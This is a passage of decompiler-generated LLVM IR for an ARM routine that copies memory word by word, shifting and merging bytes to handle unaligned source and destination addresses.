  store i32 %v2_13e60, i32* %r2.global-to-local, align 4
  %v6_13e64 = icmp slt i32 %v0_13e60, 16
  br i1 %v6_13e64, label %dec_label_pc_13e68, label %dec_label_pc_13e38.dec_label_pc_13e38_crit_edge

dec_label_pc_13e38.dec_label_pc_13e38_crit_edge:  ; preds = %dec_label_pc_13e38
  %v0_13e38.pre = load i32, i32* @lr, align 4
  %v0_13e3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e38

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13e38
  %v2_13e68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13e68, i32* @r4, align 4
  %v5_13e68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13e68, i32* @r5, align 4
  %v2_13e6c = add i32 %v0_13e60, -4
  store i32 %v2_13e6c, i32* %r2.global-to-local, align 4
  %v4_13e6c = add i32 %v0_13e60, 2147483632
  %v5_13e6c = and i32 %v2_13e6c, %v4_13e6c
  %v6_13e6c = icmp slt i32 %v5_13e6c, 0
  store i1 %v6_13e6c, i1* %cpsr_v.global-to-local, align 1
  %v7_13e6c = icmp slt i32 %v2_13e6c, 0
  store i1 %v7_13e6c, i1* %cpsr_n.global-to-local, align 1
  %v8_13e6c = icmp eq i32 %v2_13e6c, 0
  store i1 %v8_13e6c, i1* %cpsr_z.global-to-local, align 1
  %v5_13e70 = icmp slt i32 %v2_13e60, -12
  br i1 %v5_13e70, label %dec_label_pc_13e8c, label %dec_label_pc_13e74

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e68, %dec_label_pc_13e28, %dec_label_pc_13e74
  %v1_13e80 = phi i32 [ %v4_13e80, %dec_label_pc_13e74 ], [ %v12_13e5c, %dec_label_pc_13e68 ], [ %v0_13e5c74, %dec_label_pc_13e28 ]
  %v0_13e74 = load i32, i32* @lr, align 4
  %v3_13e74 = udiv i32 %v0_13e74, 256
  store i32 %v3_13e74, i32* %ip.global-to-local, align 4
  %v0_13e78 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e78 = inttoptr i32 %v0_13e78 to i32*
  %v2_13e78 = load i32, i32* %v1_13e78, align 4
  store i32 %v2_13e78, i32* @lr, align 4
  %v4_13e78 = add i32 %v0_13e78, 4
  store i32 %v4_13e78, i32* %r1.global-to-local, align 4
  %v4_13e7c = mul i32 %v2_13e78, 16777216
  %v5_13e7c = or i32 %v4_13e7c, %v3_13e74
  store i32 %v5_13e7c, i32* @ip, align 4
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  store i32 %v5_13e7c, i32* %v2_13e80, align 4
  %v3_13e80 = load i32, i32* @r0, align 4
  %v4_13e80 = add i32 %v3_13e80, 4
  store i32 %v4_13e80, i32* @r0, align 4
  %v0_13e84 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e84 = add i32 %v0_13e84, -4
  store i32 %v2_13e84, i32* %r2.global-to-local, align 4
  %v6_13e88 = icmp slt i32 %v0_13e84, 4
  br i1 %v6_13e88, label %dec_label_pc_13e8c.loopexit, label %dec_label_pc_13e74

dec_label_pc_13e8c.loopexit:                      ; preds = %dec_label_pc_13e74
  %v4_13e84 = sub i32 3, %v0_13e84
  %v5_13e84 = and i32 %v4_13e84, %v0_13e84
  %v6_13e84 = icmp slt i32 %v5_13e84, 0
  %v7_13e84 = icmp slt i32 %v2_13e84, 0
  store i1 %v6_13e84, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13e84, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e8c.loopexit, %dec_label_pc_13e68
  %v2_13dcc111 = phi i32 [ %v4_13e80, %dec_label_pc_13e8c.loopexit ], [ %v12_13e5c, %dec_label_pc_13e68 ]
  %v0_13dbc107 = phi i32 [ %v2_13e84, %dec_label_pc_13e8c.loopexit ], [ %v2_13e6c, %dec_label_pc_13e68 ]
  %v0_13e8c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e8c = add i32 %v0_13e8c, -3
  store i32 %v1_13e8c, i32* @r1, align 4
  br label %bb131

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e14
  br i1 %v5_13f04, label %dec_label_pc_13ee0, label %dec_label_pc_13e9c

dec_label_pc_13e9c:                               ; preds = %dec_label_pc_13e94
  store i32 %v2_13f00, i32* %r2.global-to-local, align 4
  %v3_13ea0 = load i32, i32* @r4, align 4
  store i32 %v3_13ea0, i32* %stack_var_-16, align 4
  %v6_13ea0 = load i32, i32* @r5, align 4
  store i32 %v6_13ea0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge, %dec_label_pc_13e9c
  %v0_13ec8 = phi i32 [ %v12_13ec8, %dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge ], [ %v0_13e5c74, %dec_label_pc_13e9c ]
  %v0_13ea8 = phi i32 [ %v0_13ea8.pre, %dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge ], [ %v4_13e18, %dec_label_pc_13e9c ]
  %v0_13ea4 = phi i32 [ %v0_13ea4.pre, %dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge ], [ %v2_13e18, %dec_label_pc_13e9c ]
  %v3_13ea4 = udiv i32 %v0_13ea4, 65536
  store i32 %v3_13ea4, i32* %r3.global-to-local, align 4
  %v1_13ea8 = inttoptr i32 %v0_13ea8 to i32*
  %v2_13ea8 = load i32, i32* %v1_13ea8, align 4
  store i32 %v2_13ea8, i32* %r4.global-to-local, align 4
  %v3_13ea8 = add i32 %v0_13ea8, 4
  %v4_13ea8 = inttoptr i32 %v3_13ea8 to i32*
  %v5_13ea8 = load i32, i32* %v4_13ea8, align 4
  store i32 %v5_13ea8, i32* %r5.global-to-local, align 4
  %v6_13ea8 = add i32 %v0_13ea8, 8
  %v7_13ea8 = inttoptr i32 %v6_13ea8 to i32*
  %v8_13ea8 = load i32, i32* %v7_13ea8, align 4
  store i32 %v8_13ea8, i32* %ip.global-to-local, align 4
  %v9_13ea8 = add i32 %v0_13ea8, 12
  %v10_13ea8 = inttoptr i32 %v9_13ea8 to i32*
  %v11_13ea8 = load i32, i32* %v10_13ea8, align 4
  store i32 %v11_13ea8, i32* @lr, align 4
  %v12_13ea8 = add i32 %v0_13ea8, 16
  store i32 %v12_13ea8, i32* %r1.global-to-local, align 4
  %v4_13eac = mul i32 %v2_13ea8, 65536
  %v5_13eac = or i32 %v4_13eac, %v3_13ea4
  store i32 %v5_13eac, i32* %r3.global-to-local, align 4
  %v3_13eb0 = udiv i32 %v2_13ea8, 65536
  %v4_13eb4 = mul i32 %v5_13ea8, 65536
  %v5_13eb4 = or i32 %v4_13eb4, %v3_13eb0
  store i32 %v5_13eb4, i32* %r4.global-to-local, align 4
  %v3_13eb8 = udiv i32 %v5_13ea8, 65536
  %v4_13ebc = mul i32 %v8_13ea8, 65536
  %v5_13ebc = or i32 %v4_13ebc, %v3_13eb8
  store i32 %v5_13ebc, i32* %r5.global-to-local, align 4
  %v3_13ec0 = udiv i32 %v8_13ea8, 65536
  %v4_13ec4 = mul i32 %v11_13ea8, 65536
  %v5_13ec4 = or i32 %v4_13ec4, %v3_13ec0
  store i32 %v5_13ec4, i32* @ip, align 4
  %v1_13ec8 = inttoptr i32 %v0_13ec8 to i32*
  store i32 %v5_13eac, i32* %v1_13ec8, align 4
  %v3_13ec8 = add i32 %v0_13ec8, 4
  %v4_13ec8 = inttoptr i32 %v3_13ec8 to i32*
  %v5_13ec8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13ec8, i32* %v4_13ec8, align 4
  %v6_13ec8 = add i32 %v0_13ec8, 8
  %v7_13ec8 = inttoptr i32 %v6_13ec8 to i32*
  %v8_13ec8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13ec8, i32* %v7_13ec8, align 4
  %v9_13ec8 = add i32 %v0_13ec8, 12
  %v10_13ec8 = inttoptr i32 %v9_13ec8 to i32*
  %v11_13ec8 = load i32, i32* @ip, align 4
  store i32 %v11_13ec8, i32* %v10_13ec8, align 4
  %v12_13ec8 = add i32 %v0_13ec8, 16
  store i32 %v12_13ec8, i32* @r0, align 4
  %v0_13ecc = load i32, i32* %r2.global-to-local, align 4
  %v2_13ecc = add i32 %v0_13ecc, -16
  store i32 %v2_13ecc, i32* %r2.global-to-local, align 4
  %v6_13ed0 = icmp slt i32 %v0_13ecc, 16
  br i1 %v6_13ed0, label %dec_label_pc_13ed4, label %dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge

dec_label_pc_13ea4.dec_label_pc_13ea4_crit_edge:  ; preds = %dec_label_pc_13ea4
  %v0_13ea4.pre = load i32, i32* @lr, align 4
  %v0_13ea8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13ea4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ea4
  %v2_13ed4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13ed4, i32* @r4, align 4
  %v5_13ed4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13ed4, i32* @r5, align 4
  %v2_13ed8 = add i32 %v0_13ecc, -4
  store i32 %v2_13ed8, i32* %r2.global-to-local, align 4
  %v4_13ed8 = add i32 %v0_13ecc, 2147483632
  %v5_13ed8 = and i32 %v2_13ed8, %v4_13ed8
  %v6_13ed8 = icmp slt i32 %v5_13ed8, 0
  store i1 %v6_13ed8, i1* %cpsr_v.global-to-local, align 1
  %v7_13ed8 = icmp slt i32 %v2_13ed8, 0
  store i1 %v7_13ed8, i1* %cpsr_n.global-to-local, align 1
  %v8_13ed8 = icmp eq i32 %v2_13ed8, 0
  store i1 %v8_13ed8, i1* %cpsr_z.global-to-local, align 1
  %v5_13edc = icmp slt i32 %v2_13ecc, -12
  br i1 %v5_13edc, label %dec_label_pc_13ef8, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ed4, %dec_label_pc_13e94, %dec_label_pc_13ee0
  %v1_13eec = phi i32 [ %v4_13eec, %dec_label_pc_13ee0 ], [ %v12_13ec8, %dec_label_pc_13ed4 ], [ %v0_13e5c74, %dec_label_pc_13e94 ]
  %v0_13ee0 = load i32, i32* @lr, align 4
  %v3_13ee0 = udiv i32 %v0_13ee0, 65536
  store i32 %v3_13ee0, i32* %ip.global-to-local, align 4
  %v0_13ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ee4 = inttoptr i32 %v0_13ee4 to i32*
  %v2_13ee4 = load i32, i32* %v1_13ee4, align 4
  store i32 %v2_13ee4, i32* @lr, align 4
  %v4_13ee4 = add i32 %v0_13ee4, 4
  store i32 %v4_13ee4, i32* %r1.global-to-local, align 4
  %v4_13ee8 = mul i32 %v2_13ee4, 65536
  %v5_13ee8 = or i32 %v4_13ee8, %v3_13ee0
  store i32 %v5_13ee8, i32* @ip, align 4
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  store i32 %v5_13ee8, i32* %v2_13eec, align 4
  %v3_13eec = load i32, i32* @r0, align 4
  %v4_13eec = add i32 %v3_13eec, 4
  store i32 %v4_13eec, i32* @r0, align 4
  %v0_13ef0 = load i32, i32* %r2.global-to-local, align 4
  %v2_13ef0 = add i32 %v0_13ef0, -4
  store i32 %v2_13ef0, i32* %r2.global-to-local, align 4
  %v6_13ef4 = icmp slt i32 %v0_13ef0, 4
  br i1 %v6_13ef4, label %dec_label_pc_13ef8.loopexit, label %dec_label_pc_13ee0

dec_label_pc_13ef8.loopexit:                      ; preds = %dec_label_pc_13ee0
  %v4_13ef0 = sub i32 3, %v0_13ef0
  %v5_13ef0 = and i32 %v4_13ef0, %v0_13ef0
  %v6_13ef0 = icmp slt i32 %v5_13ef0, 0
  %v7_13ef0 = icmp slt i32 %v2_13ef0, 0
  store i1 %v6_13ef0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13ef0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ef8.loopexit, %dec_label_pc_13ed4
  %v2_13dcc112 = phi i32 [ %v4_13eec, %dec_label_pc_13ef8.loopexit ], [ %v12_13ec8, %dec_label_pc_13ed4 ]
  %v0_13dbc108 = phi i32 [ %v2_13ef0, %dec_label_pc_13ef8.loopexit ], [ %v2_13ed8, %dec_label_pc_13ed4 ]
  %v0_13ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ef8 = add i32 %v0_13ef8, -2
  store i32 %v1_13ef8, i32* @r1, align 4
  br label %bb131

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13e14
  br i1 %v5_13f04, label %dec_label_pc_13f4c, label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13f00
  store i32 %v2_13f00, i32* %r2.global-to-local, align 4
  %v3_13f0c = load i32, i32* @r4, align 4
  store i32 %v3_13f0c, i32* %stack_var_-16, align 4
  %v6_13f0c = load i32, i32* @r5, align 4
  store i32 %v6_13f0c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13f10

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13f10.dec_label_pc_13f10_crit_edge, %dec_label_pc_13f08
  %v0_13f34 = phi i32 [ %v12_13f34, %dec_label_pc_13f10.dec_label_pc_13f10_crit_edge ], [ %v0_13e5c74, %dec_label_pc_13f08 ]
  %v0_13f14 = phi i32 [ %v0_13f14.pre, %dec_label_pc_13f10.dec_label_pc_13f10_crit_edge ], [ %v4_13e18, %dec_label_pc_13f08 ]
  %v0_13f10 = phi i32 [ %v0_13f10.pre, %dec_label_pc_13f10.dec_label_pc_13f10_crit_edge ], [ %v2_13e18, %dec_label_pc_13f08 ]
  %v3_13f10 = udiv i32 %v0_13f10, 16777216
  store i32 %v3_13f10, i32* %r3.global-to-local, align 4
  %v1_13f14 = inttoptr i32 %v0_13f14 to i32*
  %v2_13f14 = load i32, i32* %v1_13f14, align 4
  store i32 %v2_13f14, i32* %r4.global-to-local, align 4
  %v3_13f14 = add i32 %v0_13f14, 4
  %v4_13f14 = inttoptr i32 %v3_13f14 to i32*
  %v5_13f14 = load i32, i32* %v4_13f14, align 4
  store i32 %v5_13f14, i32* %r5.global-to-local, align 4
  %v6_13f14 = add i32 %v0_13f14, 8
  %v7_13f14 = inttoptr i32 %v6_13f14 to i32*
  %v8_13f14 = load i32, i32* %v7_13f14, align 4
  store i32 %v8_13f14, i32* %ip.global-to-local, align 4
  %v9_13f14 = add i32 %v0_13f14, 12
  %v10_13f14 = inttoptr i32 %v9_13f14 to i32*
  %v11_13f14 = load i32, i32* %v10_13f14, align 4
  store i32 %v11_13f14, i32* @lr, align 4
  %v12_13f14 = add i32 %v0_13f14, 16
  store i32 %v12_13f14, i32* %r1.global-to-local, align 4
  %v4_13f18 = mul i32 %v2_13f14, 256
  %v5_13f18 = or i32 %v4_13f18, %v3_13f10
  store i32 %v5_13f18, i32* %r3.global-to-local, align 4
  %v3_13f1c = udiv i32 %v2_13f14, 16777216
  %v4_13f20 = mul i32 %v5_13f14, 256
  %v5_13f20 = or i32 %v4_13f20, %v3_13f1c
  store i32 %v5_13f20, i32* %r4.global-to-local, align 4
  %v3_13f24 = udiv i32 %v5_13f14, 16777216
  %v4_13f28 = mul i32 %v8_13f14, 256
  %v5_13f28 = or i32 %v4_13f28, %v3_13f24
  store i32 %v5_13f28, i32* %r5.global-to-local, align 4
  %v3_13f2c = udiv i32 %v8_13f14, 16777216
  %v4_13f30 = mul i32 %v11_13f14, 256
  %v5_13f30 = or i32 %v4_13f30, %v3_13f2c
  store i32 %v5_13f30, i32* @ip, align 4
  %v1_13f34 = inttoptr i32 %v0_13f34 to i32*
  store i32 %v5_13f18, i32* %v1_13f34, align 4
  %v3_13f34 = add i32 %v0_13f34, 4
  %v4_13f34 = inttoptr i32 %v3_13f34 to i32*
  %v5_13f34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13f34, i32* %v4_13f34, align 4
  %v6_13f34 = add i32 %v0_13f34, 8
  %v7_13f34 = inttoptr i32 %v6_13f34 to i32*
  %v8_13f34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13f34, i32* %v7_13f34, align 4
  %v9_13f34 = add i32 %v0_13f34, 12
  %v10_13f34 = inttoptr i32 %v9_13f34 to i32*
  %v11_13f34 = load i32, i32* @ip, align 4
  store i32 %v11_13f34, i32* %v10_13f34, align 4
  %v12_13f34 = add i32 %v0_13f34, 16
  store i32 %v12_13f34, i32* @r0, align 4
  %v0_13f38 = load i32, i32* %r2.global-to-local, align 4
  %v2_13f38 = add i32 %v0_13f38, -16
  store i32 %v2_13f38, i32* %r2.global-to-local, align 4
  %v6_13f3c = icmp slt i32 %v0_13f38, 16
  br i1 %v6_13f3c, label %dec_label_pc_13f40, label %dec_label_pc_13f10.dec_label_pc_13f10_crit_edge

dec_label_pc_13f10.dec_label_pc_13f10_crit_edge:  ; preds = %dec_label_pc_13f10
  %v0_13f10.pre = load i32, i32* @lr, align 4
  %v0_13f14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f10

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f10
  %v2_13f40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13f40, i32* @r4, align 4
  %v5_13f40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13f40, i32* @r5, align 4
  %v2_13f44 = add i32 %v0_13f38, -4
  store i32 %v2_13f44, i32* %r2.global-to-local, align 4
  %v4_13f44 = add i32 %v0_13f38, 2147483632
  %v5_13f44 = and i32 %v2_13f44, %v4_13f44
  %v6_13f44 = icmp slt i32 %v5_13f44, 0
  store i1 %v6_13f44, i1* %cpsr_v.global-to-local, align 1
  %v7_13f44 = icmp slt i32 %v2_13f44, 0
  store i1 %v7_13f44, i1* %cpsr_n.global-to-local, align 1
  %v8_13f44 = icmp eq i32 %v2_13f44, 0
  store i1 %v8_13f44, i1* %cpsr_z.global-to-local, align 1
  %v5_13f48 = icmp slt i32 %v2_13f38, -12
  br i1 %v5_13f48, label %dec_label_pc_13f64, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f40, %dec_label_pc_13f00, %dec_label_pc_13f4c
  %v1_13f58 = phi i32 [ %v4_13f58, %dec_label_pc_13f4c ], [ %v12_13f34, %dec_label_pc_13f40 ], [ %v0_13e5c74, %dec_label_pc_13f00 ]
  %v0_13f4c = load i32, i32* @lr, align 4
  %v3_13f4c = udiv i32 %v0_13f4c, 16777216
  store i32 %v3_13f4c, i32* %ip.global-to-local, align 4
  %v0_13f50 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f50 = inttoptr i32 %v0_13f50 to i32*
  %v2_13f50 = load i32, i32* %v1_13f50, align 4
  store i32 %v2_13f50, i32* @lr, align 4
  %v4_13f50 = add i32 %v0_13f50, 4
  store i32 %v4_13f50, i32* %r1.global-to-local, align 4
  %v4_13f54 = mul i32 %v2_13f50, 256
  %v5_13f54 = or i32 %v4_13f54, %v3_13f4c
  store i32 %v5_13f54, i32* @ip, align 4
  %v2_13f58 = inttoptr i32 %v1_13f58 to i32*
  store i32 %v5_13f54, i32* %v2_13f58, align 4
  %v3_13f58 = load i32, i32* @r0, align 4
  %v4_13f58 = add i32 %v3_13f58, 4
  store i32 %v4_13f58, i32* @r0, align 4
  %v0_13f5c = load i32, i32* %r2.global-to-local, align 4
  %v2_13f5c = add i32 %v0_13f5c, -4
  store i32 %v2_13f5c, i32* %r2.global-to-local, align 4
  %v6_13f60 = icmp slt i32 %v0_13f5c, 4
  br i1 %v6_13f60, label %dec_label_pc_13f64.loopexit, label %dec_label_pc_13f4c

dec_label_pc_13f64.loopexit:                      ; preds = %dec_label_pc_13f4c
  %v4_13f5c = sub i32 3, %v0_13f5c
  %v5_13f5c = and i32 %v4_13f5c, %v0_13f5c
  %v6_13f5c = icmp slt i32 %v5_13f5c, 0
  %v7_13f5c = icmp slt i32 %v2_13f5c, 0
  store i1 %v6_13f5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13f5c, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f64

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f64.loopexit, %dec_label_pc_13f40
  %v2_13dcc113 = phi i32 [ %v4_13f58, %dec_label_pc_13f64.loopexit ], [ %v12_13f34, %dec_label_pc_13f40 ]
  %v0_13dbc109 = phi i32 [ %v2_13f5c, %dec_label_pc_13f64.loopexit ], [ %v2_13f44, %dec_label_pc_13f40 ]
  %v0_13f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f64 = add i32 %v0_13f64, -1
  store i32 %v1_13f64, i32* @r1, align 4
  br label %bb131

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13d20
  %v1_13f6c = load i32, i32* @r2, align 4
  %v2_13f6c = add i32 %v1_13f6c, %v0_13d20
  store i32 %v2_13f6c, i32* %r1.global-to-local, align 4
  %v2_13f70 = add i32 %v1_13f6c, %v1_13d20
  store i32 %v2_13f70, i32* %r0.global-to-local, align 4
  %v2_13f74 = add i32 %v1_13f6c, -4
  store i32 %v2_13f74, i32* %r2.global-to-local, align 4
  %v4_13f74 = sub i32 3, %v1_13f6c
  %v5_13f74 = and i32 %v4_13f74, %v1_13f6c
  %v6_13f74 = icmp slt i32 %v5_13f74, 0
  store i1 %v6_13f74, i1* %cpsr_v.global-to-local, align 1
  %v7_13f74 = icmp slt i32 %v2_13f74, 0
  store i1 %v7_13f74, i1* %cpsr_n.global-to-local, align 1
  %v8_13f74 = icmp eq i32 %v1_13f6c, 4
  store i1 %v8_13f74, i1* %cpsr_z.global-to-local, align 1
  %v5_13f78 = icmp slt i32 %v1_13f6c, 4
  br i1 %v5_13f78, label %bb141, label %dec_label_pc_13f7c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f6c
  %v1_13f7c = urem i32 %v2_13f70, 4
  store i32 %v1_13f7c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13f7c = icmp eq i32 %v1_13f7c, 0
  store i1 %v2_13f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f7c, label %dec_label_pc_13f84, label %dec_label_pc_14024

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f7c
  %v1_13f84 = urem i32 %v2_13f6c, 4
  store i32 %v1_13f84, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13f84 = icmp eq i32 %v1_13f84, 0
  store i1 %v2_13f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f84, label %dec_label_pc_13f8c, label %dec_label_pc_14050

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_14048
  %v0_13fa448 = phi i32 [ %v2_13f70, %dec_label_pc_13f84 ], [ %v0_1409831, %dec_label_pc_14048 ]
  %v0_13fa047 = phi i32 [ %v2_13f6c, %dec_label_pc_13f84 ], [ %v0_14048, %dec_label_pc_14048 ]
  %v0_13f8c = phi i32 [ %v2_13f74, %dec_label_pc_13f84 ], [ %v2_14040, %dec_label_pc_14048 ]
  %v2_13f8c = add i32 %v0_13f8c, -8
  store i32 %v2_13f8c, i32* %r2.global-to-local, align 4
  %v4_13f8c = sub i32 7, %v0_13f8c
  %v5_13f8c = and i32 %v4_13f8c, %v0_13f8c
  %v6_13f8c = icmp slt i32 %v5_13f8c, 0
  store i1 %v6_13f8c, i1* %cpsr_v.global-to-local, align 1
  %v7_13f8c = icmp slt i32 %v2_13f8c, 0
  store i1 %v7_13f8c, i1* %cpsr_n.global-to-local, align 1
  %v8_13f8c = icmp eq i32 %v0_13f8c, 8
  store i1 %v8_13f8c, i1* %cpsr_z.global-to-local, align 1
  %v5_13f90 = icmp slt i32 %v0_13f8c, 8
  br i1 %v5_13f90, label %dec_label_pc_13fdc, label %dec_label_pc_13f94

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f8c
  %v3_13f94 = load i32, i32* @r4, align 4
  store i32 %v3_13f94, i32* %stack_var_-8, align 4
  %v6_13f94 = load i32, i32* @lr, align 4
  %v2_13f98 = add i32 %v0_13f8c, -28
  store i32 %v2_13f98, i32* %r2.global-to-local, align 4
  %v4_13f98 = sub i32 27, %v0_13f8c
  %v5_13f98 = and i32 %v4_13f98, %v2_13f8c
  %v6_13f98 = icmp slt i32 %v5_13f98, 0
  store i1 %v6_13f98, i1* %cpsr_v.global-to-local, align 1
  %v7_13f98 = icmp slt i32 %v2_13f98, 0
  store i1 %v7_13f98, i1* %cpsr_n.global-to-local, align 1
  %v8_13f98 = icmp eq i32 %v2_13f8c, 20
  store i1 %v8_13f98, i1* %cpsr_z.global-to-local, align 1
  %v5_13f9c = icmp slt i32 %v2_13f8c, 20
  br i1 %v5_13f9c, label %dec_label_pc_13fb8, label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f94, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge
  %v0_13fa4 = phi i32 [ %v1_13fac, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ %v0_13fa448, %dec_label_pc_13f94 ]
  %v0_13fa0 = phi i32 [ %v0_13fa0.pre, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ %v0_13fa047, %dec_label_pc_13f94 ]
  %v1_13fa0 = add i32 %v0_13fa0, -4
  %v2_13fa0 = inttoptr i32 %v1_13fa0 to i32*
  %v3_13fa0 = load i32, i32* %v2_13fa0, align 4
  store i32 %v3_13fa0, i32* %r3.global-to-local, align 4
  %v4_13fa0 = add i32 %v0_13fa0, -8
  %v5_13fa0 = inttoptr i32 %v4_13fa0 to i32*
  %v6_13fa0 = load i32, i32* %v5_13fa0, align 4
  store i32 %v6_13fa0, i32* %r4.global-to-local, align 4
  %v7_13fa0 = add i32 %v0_13fa0, -12
  %v8_13fa0 = inttoptr i32 %v7_13fa0 to i32*
  %v9_13fa0 = load i32, i32* %v8_13fa0, align 4
  store i32 %v9_13fa0, i32* %ip.global-to-local, align 4
  %v10_13fa0 = add i32 %v0_13fa0, -16
  %v11_13fa0 = inttoptr i32 %v10_13fa0 to i32*
  %v12_13fa0 = load i32, i32* %v11_13fa0, align 4
  store i32 %v12_13fa0, i32* %lr.global-to-local, align 4
  store i32 %v10_13fa0, i32* %r1.global-to-local, align 4
  %v1_13fa4 = add i32 %v0_13fa4, -16
  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  store i32 %v3_13fa0, i32* %v2_13fa4, align 4
  %v4_13fa4 = add i32 %v0_13fa4, -12
  %v5_13fa4 = inttoptr i32 %v4_13fa4 to i32*
  %v6_13fa4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13fa4, i32* %v5_13fa4, align 4
  %v7_13fa4 = add i32 %v0_13fa4, -8
  %v8_13fa4 = inttoptr i32 %v7_13fa4 to i32*
  %v9_13fa4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_13fa4, i32* %v8_13fa4, align 4
  %v10_13fa4 = add i32 %v0_13fa4, -4
  %v11_13fa4 = inttoptr i32 %v10_13fa4 to i32*
  %v12_13fa4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13fa4, i32* %v11_13fa4, align 4
  store i32 %v1_13fa4, i32* %r0.global-to-local, align 4
  %v0_13fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13fa8 = add i32 %v0_13fa8, -4
  %v2_13fa8 = inttoptr i32 %v1_13fa8 to i32*
  %v3_13fa8 = load i32, i32* %v2_13fa8, align 4
  store i32 %v3_13fa8, i32* %r3.global-to-local, align 4
  %v4_13fa8 = add i32 %v0_13fa8, -8
  %v5_13fa8 = inttoptr i32 %v4_13fa8 to i32*
  %v6_13fa8 = load i32, i32* %v5_13fa8, align 4
  store i32 %v6_13fa8, i32* %r4.global-to-local, align 4
  %v7_13fa8 = add i32 %v0_13fa8, -12
  %v8_13fa8 = inttoptr i32 %v7_13fa8 to i32*
  %v9_13fa8 = load i32, i32* %v8_13fa8, align 4
  store i32 %v9_13fa8, i32* @ip, align 4
  %v10_13fa8 = add i32 %v0_13fa8, -16
  %v11_13fa8 = inttoptr i32 %v10_13fa8 to i32*
  %v12_13fa8 = load i32, i32* %v11_13fa8, align 4
  store i32 %v12_13fa8, i32* %lr.global-to-local, align 4
  store i32 %v10_13fa8, i32* %r1.global-to-local, align 4
  %v1_13fac = add i32 %v0_13fa4, -32
  %v2_13fac = inttoptr i32 %v1_13fac to i32*
  store i32 %v3_13fa8, i32* %v2_13fac, align 4
  %v4_13fac = add i32 %v0_13fa4, -28
  %v5_13fac = inttoptr i32 %v4_13fac to i32*
  %v6_13fac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13fac, i32* %v5_13fac, align 4
  %v7_13fac = add i32 %v0_13fa4, -24
  %v8_13fac = inttoptr i32 %v7_13fac to i32*
  %v9_13fac = load i32, i32* @ip, align 4
  store i32 %v9_13fac, i32* %v8_13fac, align 4
  %v10_13fac = add i32 %v0_13fa4, -20
  %v11_13fac = inttoptr i32 %v10_13fac to i32*
  %v12_13fac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13fac, i32* %v11_13fac, align 4
  store i32 %v1_13fac, i32* %r0.global-to-local, align 4
  %v0_13fb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_13fb0 = add i32 %v0_13fb0, -32
